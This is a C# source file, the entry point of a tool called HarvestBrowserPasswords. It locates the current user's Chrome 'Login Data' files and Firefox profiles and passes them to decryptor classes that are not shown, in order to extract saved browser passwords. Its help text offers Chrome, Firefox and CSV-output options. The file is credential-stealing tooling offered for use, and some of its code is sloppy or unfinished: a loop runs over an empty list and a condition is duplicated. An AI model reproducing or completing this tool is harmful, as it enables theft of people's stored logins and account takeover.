using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.IO;

namespace HarvestBrowserPasswords
{
    class Program
    {

        static void Main(string[] args)
        {
            //Get username of current user account
            string userAccountName = GetCurrentUser();

            //TODO: Implement better command-line parsing with NuGet CommandLineParser
            //Set Master password for Firefox logins
            /*if(args.Contains("-p"))
            {
                string masterPassword = <some regex with args -p???>
            }
            else:
            {
                string masterPassword = ""
            }*/
            //Parse command line arguments
            if (args.Contains("-a"))
            {
                GetChromePasswords(userAccountName);
                GetFirefoxPasswords(userAccountName);
            }
            else if (args.Contains("-g"))
            {
                GetChromePasswords(userAccountName);
            }
            else if (args.Contains("-f"))
            {
                GetFirefoxPasswords(userAccountName);
            }
            else
            {
                DisplayHelpMessage();
            }
        }

        //Check if currently running in administrator context
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
      
        public static void GetChromePasswords(string userAccountName)
        {
            List<string> chromeProfiles = FindChromeProfiles(userAccountName);

            foreach (string chromeProfile in chromeProfiles)
            {
                string loginDataFile = chromeProfile + @"\Login Data";
                if (File.Exists(loginDataFile))
                {
                    Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
                    new ChromeDatabaseDecryptor(loginDataFile);
                }
            }
        }

        public static List<string> FindChromeProfiles(string userAccountName)
        {
            string chromeDirectory = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data";
            List<string> profileDirectories = new List<string>();

            foreach (string directory in profileDirectories)
            {
                Console.WriteLine(directory);
            }

            if (Directory.Exists(chromeDirectory))
            if (Directory.Exists(chromeDirectory))
            {
                //Add default profile location once existence of chrome directory is confirmed
                profileDirectories.Add(chromeDirectory + "\\Default");
                foreach (string directory in Directory.GetDirectories(chromeDirectory))
                {
                    if (directory.Contains("Profile "))
                    {
                        profileDirectories.Add(directory);
                        Console.WriteLine($"[+] Found Chrome Profile at {directory}");
                    }
                }
            }
            return profileDirectories;
        }

        public static void GetFirefoxPasswords(string userAccountName)
        {
            foreach (string profile in FindFirefoxProfiles(userAccountName))
            {
                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile);
            }
        }

        public static List<string> FindFirefoxProfiles(string userAccountName)
        {

            //List to store profile directories
            List<string> profileDirectories = new List<string>();

            //Roaming directory contains most firefox artifacts apart from cache
            string roamingDir = $"C:\\Users\\{userAccountName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";

            //Check roaming profile
            if (Directory.Exists(roamingDir))
            {

                string[] roamingProfiles = Directory.GetDirectories(roamingDir);
                foreach (string directory in roamingProfiles)
                {
                    profileDirectories.Add(directory);
                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
                }
            }

            return profileDirectories;
        }

        public static string GetCurrentUser()
        {
            //Get username for currently running account (SamCompatible Enum format)
            string userAccountSamCompatible = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            
            //Remove domain and backslashes from name
            int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
            string userAccountName = userAccountSamCompatible.Substring(index);

            Console.WriteLine($"[*] Running As: {userAccountSamCompatible}");

            return userAccountName;
        }

        public static void DisplayHelpMessage()
        {
            Console.WriteLine("Help Message for HarvestBrowserPasswords.exe");
            Console.WriteLine($"Usage: HarvestBrowserPasswords.exe <options>");
            Console.WriteLine("Options:");
            Console.WriteLine($"-h                  Help                display this help message");
            Console.WriteLine($"-g                  Google Chrome       extract Google Chrome passwords");
            Console.WriteLine($"-f                  Firefox             extract Firefox passwords");
            Console.WriteLine($"-a                  All Browsers        extract passwords from all browsers");
            Console.WriteLine($"-p \"<password>\"   Password            (optional) specify master password for Firefox logins");
            Console.WriteLine($"-c                  CSV                 write output to csv file");
        }
    }  
}
